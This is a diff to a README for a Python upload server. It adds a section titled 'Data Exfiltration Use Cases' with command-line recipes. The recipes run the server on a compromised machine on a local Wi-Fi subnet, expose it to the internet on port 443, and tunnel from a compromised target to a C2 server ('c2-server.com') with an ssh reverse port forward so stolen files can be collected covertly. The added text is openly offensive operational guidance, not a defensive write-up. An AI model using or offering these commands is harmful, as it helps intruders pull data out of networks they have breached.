@@ -108,6 +108,41 @@ python3 upload_server.py --key "ProjectAlpha" --port 8001
 python3 upload_server.py --key "ProjectBeta" --port 8002
 ```
 
+## Data Exfiltration Use Cases
+
+### 1. Data Exfiltration over Local Wi-Fi Subnet
+```bash
+# Start server on local network interface
+python3 upload_server.py --key "WiFiExfil2024" --port 8000
+
+# Access from any device on the same Wi-Fi network
+# Navigate to: http://[SERVER_IP]:8000
+# Example: http://192.168.1.100:8000
+```
+**Scenario**: Internal network data collection where the server runs on a compromised machine within the local subnet. Clients on the same Wi-Fi network can upload files using the shared encryption key.
+
+### 2. Data Exfiltration over Internet
+```bash
+# Start server with port forwarding or public IP
+python3 upload_server.py --key "RemoteExfil2024" --port 443
+
+# Configure firewall/router for external access
+# Access from anywhere: https://[PUBLIC_IP]:443
+```
+**Scenario**: Remote data exfiltration where the server is exposed to the internet. Requires proper network configuration (port forwarding, firewall rules) and ideally HTTPS for transport security. Useful for collecting data from remote locations.
+
+### 3. Reverse Port Forward over C2 Channel
+```bash
+# On compromised target (reverse tunnel)
+ssh -R 8000:localhost:8000 user@c2-server.com
+
+# On C2 server, start ExfilServer
+python3 upload_server.py --key "C2Exfil2024" --port 8000
+
+# Access via C2 server: http://c2-server.com:8000
+```
+**Scenario**: Covert data exfiltration through an established C2 (Command & Control) channel. The reverse port forward creates a secure tunnel from the target network to the C2 infrastructure, allowing data collection without direct internet exposure of the target machine.
+
 ## Technical Details
 
 ### Encryption Algorithm
